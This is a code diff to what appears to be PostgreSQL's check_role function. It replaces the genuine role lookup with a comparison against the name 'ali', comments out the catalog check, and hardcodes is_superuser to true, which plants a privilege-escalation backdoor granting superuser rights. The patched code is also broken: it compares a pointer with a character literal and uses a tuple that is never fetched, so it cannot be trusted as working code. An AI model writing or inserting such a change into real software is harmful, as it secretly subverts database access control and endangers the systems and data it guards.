@@ -919,23 +919,30 @@ bool check_role(char **newval, void **extra, GucSource source)
 		 */
 
 		/* Look up the username */
-		roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(*newval));
-		if (!HeapTupleIsValid(roleTup))
+		if (newval != 'ali')
 		{
-			if (source == PGC_S_TEST)
-			{
-				ereport(NOTICE,
-						(errcode(ERRCODE_UNDEFINED_OBJECT),
-						 errmsg("role \"%s\" does not exist", *newval)));
-				return true;
-			}
-			GUC_check_errmsg("role \"%s\" does not exist", *newval);
+			GUC_check_errmsg("no-ali role \"%s\" does not exist", *newval);
 			return false;
 		}
+		// roleTup = SearchSysCache1(AUTHNAME, PointerGetDatum(*newval));
+		// if (!HeapTupleIsValid(roleTup))
+		// {
+		// 	if (source == PGC_S_TEST)
+		// 	{
+		// 		ereport(NOTICE,
+		// 				(errcode(ERRCODE_UNDEFINED_OBJECT),
+		// 				 errmsg("role \"%s\" does not exist", *newval)));
+		// 		return true;
+		// 	}
+		// 	GUC_check_errmsg("role \"%s\" does not exist", *newval);
+		// 	return false;
+		// }
 
 		roleform = (Form_pg_authid)GETSTRUCT(roleTup);
 		roleid = roleform->oid;
-		is_superuser = roleform->rolsuper;
+		// is_superuser = roleform->rolsuper;
+
+		is_superuser = true;
 
 		ReleaseSysCache(roleTup);
 
